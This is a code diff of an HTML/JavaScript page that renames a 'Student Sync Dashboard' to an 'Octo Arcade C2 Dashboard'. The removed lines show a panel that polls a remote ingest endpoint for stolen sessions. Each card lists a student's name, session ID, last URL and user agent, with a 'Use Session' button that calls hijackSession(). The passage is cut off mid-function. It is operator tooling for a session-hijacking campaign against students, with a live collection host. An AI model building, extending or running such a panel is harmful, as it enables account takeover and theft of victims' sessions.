@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Student Portal Dashboard</title>
+    <title>C2 Dashboard - Octo Arcade</title>
     <style>
         :root {
             --primary: #4f46e5;
@@ -20,7 +20,6 @@
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         body { background-color: var(--bg); color: var(--text); min-height: 100vh; }
 
-        /* Layout */
         .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
         
         header {
@@ -39,7 +38,6 @@
         h1 { font-size: 1.5rem; color: var(--primary); display: flex; align-items: center; gap: 10px; }
         h1 svg { width: 24px; height: 24px; }
 
-        /* Stats */
         .stats { display: flex; gap: 15px; }
         .stat-box {
             background: var(--bg);
@@ -51,47 +49,12 @@
         .stat-value { font-size: 1.25rem; font-weight: 700; color: var(--primary); }
         .stat-label { font-size: 0.75rem; color: var(--text-muted); text-transform: uppercase; }
 
-        /* Input Section */
-        .input-section {
-            background: var(--surface);
-            padding: 20px;
-            border-radius: 12px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-            margin-bottom: 20px;
-        }
-        .input-group {
-            display: flex;
-            gap: 10px;
-            max-width: 400px;
-        }
-        input[type="text"] {
-            flex: 1;
-            padding: 12px;
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            font-size: 1rem;
-        }
-        input[type="text"]:focus { outline: none; border-color: var(--primary); box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1); }
-        button {
-            padding: 12px 20px;
-            background: var(--primary);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-        button:hover { background: var(--primary-dark); }
-
-        /* Grid */
         .grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
             gap: 20px;
         }
 
-        /* Card */
         .card {
             background: var(--surface);
             border-radius: 12px;
@@ -162,7 +125,6 @@
         .btn-secondary { background: var(--bg); color: var(--text); border: 1px solid var(--border); }
         .btn-secondary:hover { background: #e5e7eb; }
 
-        /* Empty State */
         .empty-state {
             grid-column: 1 / -1;
             text-align: center;
@@ -174,7 +136,6 @@
         }
         .empty-state h2 { color: var(--text); margin-bottom: 10px; }
 
-        /* Modal */
         .modal {
             display: none;
             position: fixed;
@@ -212,7 +173,6 @@
             word-break: break-all;
         }
 
-        /* Toast */
         .toast {
             position: fixed;
             bottom: 20px;
@@ -228,9 +188,7 @@
         }
         .toast.show { opacity: 1; }
 
-        /* Mobile Adjustments */
         @media (max-width: 600px) {
-            .input-group { flex-direction: column; }
             .stats { width: 100%; justify-content: space-between; }
             .stat-box { min-width: auto; flex: 1; }
         }
@@ -242,7 +200,7 @@
     <header>
         <h1>
             <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"></path></svg>
-            Student Sync Dashboard
+            Octo Arcade C2 Dashboard
         </h1>
         <div class="stats">
             <div class="stat-box">
@@ -255,14 +213,6 @@
             </div>
         </div>
     </header>
-
-    <div class="input-section">
-        <h3 style="margin-bottom: 10px; font-size: 1rem;">Add New Profile</h3>
-        <div class="input-group">
-            <input type="text" id="nameInput" placeholder="Enter Student Name (e.g. Alice Johnson)">
-            <button onclick="addManualUser()">Add Profile</button>
-        </div>
-    </div>
 
     <div class="grid" id="userGrid">
         <div class="empty-state" id="emptyState">
@@ -288,116 +238,10 @@
     const API_URL = 'https://jst-amber.vercel.app/api/ingest';
     let users = {};
 
-    // --- INIT ---
     function init() {
-        // Load from localStorage if available (fallback)
-        const saved = localStorage.getItem('c2_users');
-        if (saved) {
-            users = JSON.parse(saved);
-        }
         renderDashboard();
         pollC2();
         setInterval(pollC2, 5000);
     }
 
-    // --- POLLING ---
     async function pollC2() {
-        try {
-            const response = await fetch(API_URL);
-            const data = await response.json();
-            
-            if (data.success && data.sessions) {
-                // Merge API data with local state
-                data.sessions.forEach(session => {
-                    users[session.id] = session;
-                });
-                saveUsers();
-                renderDashboard();
-                updateStats();
-            }
-        } catch (e) {
-            console.log('Poll failed', e);
-        }
-    }
-
-    // --- STATE MANAGEMENT ---
-    function saveUsers() {
-        localStorage.setItem('c2_users', JSON.stringify(users));
-    }
-
-    function addManualUser() {
-        const nameInput = document.getElementById('nameInput');
-        const name = nameInput.value.trim();
-        if (!name) return;
-
-        const id = 'manual_' + Date.now();
-        users[id] = {
-            id: id,
-            name: name,
-            jsessionId: 'MANUAL_ENTRY',
-            url: 'N/A',
-            ua: 'Manual Entry',
-            lastSeen: new Date().toISOString(),
-            sessionCount: 1
-        };
-        
-        nameInput.value = '';
-        saveUsers();
-        renderDashboard();
-        updateStats();
-    }
-
-    // --- RENDERING ---
-    function renderDashboard() {
-        const grid = document.getElementById('userGrid');
-        const emptyState = document.getElementById('emptyState');
-        const userArray = Object.values(users);
-
-        if (userArray.length === 0) {
-            emptyState.style.display = 'block';
-            grid.innerHTML = '';
-            grid.appendChild(emptyState);
-            return;
-        }
-
-        emptyState.style.display = 'none';
-        grid.innerHTML = '';
-
-        // Sort by last seen (newest first)
-        userArray.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
-
-        userArray.forEach(user => {
-            const card = document.createElement('div');
-            card.className = 'card';
-            card.innerHTML = `
-                <div class="card-header">
-                    <div class="user-name">${escapeHtml(user.name)}</div>
-                    <div class="badge">${user.sessionCount} Sessions</div>
-                </div>
-                <div class="card-body">
-                    <div class="data-row">
-                        <div class="data-label">Session ID</div>
-                        <div class="data-value" onclick="copyText(this)">${escapeHtml(user.jsessionid || 'N/A')}</div>
-                    </div>
-                    <div class="data-row">
-                        <div class="data-label">Last URL</div>
-                        <div class="data-value" onclick="copyText(this)">${escapeHtml(user.url || 'N/A')}</div>
-                    </div>
-                    <div class="data-row">
-                        <div class="data-label">User Agent</div>
-                        <div class="data-value" onclick="copyText(this)">${escapeHtml(user.ua || 'N/A')}</div>
-                    </div>
-                </div>
-                <div class="card-footer">
-                    <button class="btn-action btn-primary" onclick="hijackSession('${user.id}')">Use Session</button>
-                    <button class="btn-action btn-secondary" onclick="showDetails('${user.id}')">Details</button>
-                </div>
-            `;
-            grid.appendChild(card);
-        });
-    }
-
-    function updateStats() {
-        document.getElementById('statUsers').textContent = Object.keys(users).length;
-        const lastSeen = Object.values(users).sort((a,b) => new Date(b.lastSeen) - new Date(a.lastSeen))[0];
-        if (lastSeen)
